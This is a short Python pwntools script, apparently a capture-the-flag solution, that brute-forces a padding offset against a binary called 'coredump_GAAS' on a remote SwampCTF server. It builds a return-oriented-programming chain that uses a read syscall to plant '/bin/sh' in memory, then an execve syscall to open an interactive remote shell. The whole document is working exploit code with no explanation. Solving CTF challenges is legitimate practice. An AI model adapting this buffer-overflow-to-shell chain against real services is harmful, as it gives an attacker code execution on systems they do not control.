from pwn import *
exe = context.binary = ELF("./coredump_GAAS")
for i in range(100):
    wa_memory = 0x404030
    rop = ROP(exe)
    r = remote("chals.swampctf.com",40003)
    rop.raw(b"A" * i)
    rop.rax = 0
    rop.rdi = 0
    rop.rsi = wa_memory
    rop.rdx = 0xff
    rop.raw(rop.find_gadget(['syscall','ret'])[0])
    rop.rax = 59
    rop.rdi = wa_memory
    rop.rsi = 0
    rop.rdx = 0
    rop.raw(rop.find_gadget(['syscall','ret'])[0])
    r.sendline(rop.chain())
    r.send(b"/bin/sh\x00")
    r.interactive()
    print(rop.dump())
    